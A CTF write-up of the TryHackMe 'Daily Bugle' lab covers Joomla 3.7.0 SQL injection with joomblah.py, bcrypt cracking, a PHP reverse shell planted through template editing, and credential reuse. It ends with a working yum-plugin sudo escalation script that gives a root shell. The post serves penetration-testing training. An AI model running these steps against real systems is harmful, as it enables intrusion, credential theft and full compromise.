---
layout: post
title: THM Daily Bugle WriteUp
date: 2025-03-04
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - Joomla-Exploitation
  - SQL-Injection
  - Privilege-Escalation
  - Sudoers-Abusing
  - Yum-Privilege-Escalation
  - Password-Cracking
  - Credentials-Leakage
media_subpath: /assets/img/DailyBugle
---
![Desktop View](DailyBugle.png){: w="400"  h="400" }



# Daily Bugle Skills


>**Daily Bugle** is a hard Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Application Enumeration**
- **Joomla Enumeration**
- **Exploiting Joomla SQL Injection**
- **Credential Harvesting from SQL Injection**
- **Admin Panel Exploitation**
- **Web Shell Upload via Joomla Template Injection**
- **Reverse Shell Execution**
- **Linux Privilege Enumeration**
- **Exploiting Sudo Permissions for Privilege Escalation**
- **Privilege Escalation via Yum Package Manager Abuse**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22** & port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.246.66 -oG allPorts
Nmap scan report for 10.10.246.66
Host is up, received user-set (0.11s latency).
Scanned at 2025-03-04 18:07:07 CET for 14s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80,3306 10.10.246.66 -oN targeted
Nmap scan report for 10.10.246.66
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 7.4 (protocol 2.0)**
- **Port  80 -->  Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)**
- **Port 3306 --> MariaDB 10.3.23 or earlier**

Let's start with the **HTTP** service.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.246.66
http://10.10.246.66 [200 OK] Apache[2.4.6], Bootstrap, Cookies[eaa83fe8b963ab08ce9ab7d4a798de05], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40], HttpOnly[eaa83fe8b963ab08ce9ab7d4a798de05], IP[10.10.246.66], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PHP[5.6.40], PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/5.6.40]
```

Nothing really useful found, so let's take a look inside the website, once inside ***http://10.10.246.66***, we are facing a blog, we also know that we are facing a **Joomla** from the `nmap` scan.

![Desktop View](DailyBugleMainPage.png) 

The first thing that we want to know facing a **Joomla** CMS is knowing the version, we can check this by accessing the `joomla.xml` file.

```bash
http://10.10.246.66/administrator/manifests/files/joomla.xml
```

![Desktop View](DailyBugleJoomlaVersion.png)

We can see that we are facing a **Joomla 3.7.0**, searching a bit about this version, i found that is vulnerable to **SQL Injection**.

Searching a bit more i found an exploit named `joomblah.py` that automate the exploitation and get all the important information from the database, let's download the exploit and use it.

```bash
❯ wget https://raw.githubusercontent.com/XiphosResearch/exploits/refs/heads/master/Joomblah/joomblah.py
```

Once with the exploit, give it execution perms and execute it.

```bash
❯ chmod +x joomblah.py
❯ python2 joomblah.py http://10.10.246.66
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'j***h', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh******uc4Xya.dfy2MF.bZhz0jVMw******12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Bingo, we have retrieved a user and a hash, let's try to crack the hash.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press 'q' or Ctrl-C to abort, almost any other key for status
sp*****an123    (?)     
```

After a while, we finally cracked the hash, so let's login with the valid credentials to `http://10.10.246.66/administrator/`

![Desktop View](DailyBugleLogin.png)

Once inside we are in front of a **Joomla** dashboard.

![Desktop View](DailyBugleDashBoard.png)

Once inside the **Joomla** dashboard it's pretty easy to get RCE, we can upload a webshell doing the following steps: **Extensions ->  Templates -> Templates**.

Then we have to select the currently active **template**, in this case **Protostar**, so select **Protostar Details and Files**, and select the `index.php` file and change it's content with the classic **pentestmonkey** reverse shell.

You can download the reverse shell here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![Desktop View](DailyBugleReverseShell.png)

Once modified, click the button **Save**, then we just have to set a `netcat` listener and access the following URL: ***http://10.10.246.66***.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.14.99.119] from (UNKNOWN) [10.10.246.66] 49842
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:39:50 up 35 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
apache
```

## Shell as Apache

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

Once with a stable shell, we can begin with the **privilege escalation** phase, i checked the `sudoers`, `SUID binaries`, etc. Nothing found, remembering that there is a `mySQL` database up, so let's seek for a `config` file with valid credentials.

```bash
bash-4.2$ find / -name "*config*.php*" 2>/dev/null 
/var/www/html/administrator/components/com_admin/views/sysinfo/tmpl/default_config.php
/var/www/html/administrator/components/com_config/config.php
/var/www/html/administrator/components/com_config/helper/config.php
/var/www/html/administrator/components/com_config/model/field/configcomponents.php
/var/www/html/administrator/components/com_messages/controllers/config.php
/var/www/html/administrator/components/com_messages/models/config.php
/var/www/html/administrator/templates/hathor/html/com_admin/sysinfo/default_config.php
/var/www/html/components/com_config/config.php
/var/www/html/components/com_config/model/config.php
/var/www/html/libraries/cms/component/router/viewconfiguration.php
/var/www/html/configuration.php
```

The `/var/www/html/configuration.php` file seems juicy, let's see what's inside.

```bash
bash-4.2$ cat /var/www/html/configuration.php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9******VjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
```

Bingo, we found valid credentials for the `mySQL` database, that doesn't give us any value, since we already got access to the database, but we can try if they did reuse the credentials in any system user.

```bash
bash-4.2$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
```

There are two users in the target machine, i tried login as `root` but it didn't work, but after trying with the user `jjameson` and we get successfully login.

```bash
bash-4.2$ su jjameson
Password: ***********
[jjameson@dailybugle /]$ whoami
jjameson
```

---

## Shell as JJameson

Once as user `jjameson` we can read the `user.txt` flag at `/home/jjameson/user.txt`.

```bash
[jjameson@dailybugle ~]$ cat /home/jjameson/user.txt 
27a******cba712cfd******6d80442e
```

Checking again some **PrivEsc** ways, i found that we can execute the `yum` binary as `root`.

```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Checking the [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo) website i found that we can elevate privileges using the `yum` binary.

### **How Yum Plugins Work**

Yum **supports plugins**, which are Python scripts that extend its functionality. When Yum starts, it loads **enabled plugins** from a specified directory. If a user runs `sudo yum`, any plugin executed **inherits root privileges**.

This exploit **creates a malicious plugin** that runs arbitrary code (in this case, a root shell).

---

### **Step-by-Step Breakdown**

#### **1. Create a Temporary Directory**

The attack starts by creating a temporary directory (`TF`) to store the malicious plugin.

```bash
[jjameson@dailybugle tmp]$ TF=$(mktemp -d)
```

- `mktemp -d` → Creates a **random temporary directory**.

---

#### **2. Create a Custom Yum Configuration File (`x`)**

This tells Yum to **load plugins** from the attacker's temporary directory.

```bash
[jjameson@dailybugle tmp]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
```

##### **What This Does:**

- `plugins=1` → **Enables Yum plugins**.
- `pluginpath=$TF` → Tells Yum to **load plugins** from the attacker's folder.
- `pluginconfpath=$TF` → Sets the **plugin configuration file path** to the attacker's folder.

---

#### **3. Create the Plugin Configuration File (`y.conf`)**

This file **enables the malicious plugin**.

```bash
[jjameson@dailybugle tmp]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
```

- `enabled=1` → **Activates** the plugin.

---

#### **4. Create the Malicious Plugin (`y.py`)**

This Python script is the **actual exploit**. It will execute **a root shell** when Yum loads it.

```bash
[jjameson@dailybugle tmp]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
```

##### **How This Works:**

- `import os` → Access to system functions.
- `import yum` → Integrates with Yum.
- `requires_api_version='2.1'` → Required for Yum plugins.
- `def init_hook(conduit):` → **Runs when the plugin is loaded.**
- `os.execl('/bin/sh', '/bin/sh')` → **Spawns a root shell**.

---

#### **5. Execute Yum to Trigger the Exploit**

Now, the attacker runs Yum with the malicious plugin:

```bash
[jjameson@dailybugle tmp]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
```

I just followed the steps stipulated at the **GTFOBins** website.

Now you can read the `root.txt` flag at `/root/root.txt`.

```bash
sh-4.2# cat /root/root.txt 
ee******92b18218******58d7fa6f79
```

## Final Thoughts

The **Daily Bugle** machine offers a comprehensive learning experience, emphasizing the exploitation of **CMS vulnerabilities** and **Linux privilege escalation**. The initial access phase involves identifying and exploiting a **blind SQL injection** vulnerability in Joomla 3.7.0, underscoring the importance of thorough **web application enumeration** and **version detection**. Gaining a foothold requires leveraging compromised credentials to access the Joomla administrator panel and injecting a **PHP reverse shell** through template modification. Privilege escalation is achieved by exploiting misconfigured **sudo permissions** on the **Yum package manager**, demonstrating the critical need for proper configuration management. This machine effectively reinforces key skills in **web exploitation**, **password cracking**, and **privilege escalation**, serving as a valuable exercise for those seeking to enhance their penetration testing capabilities.

![Desktop View](DailyBuglePwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

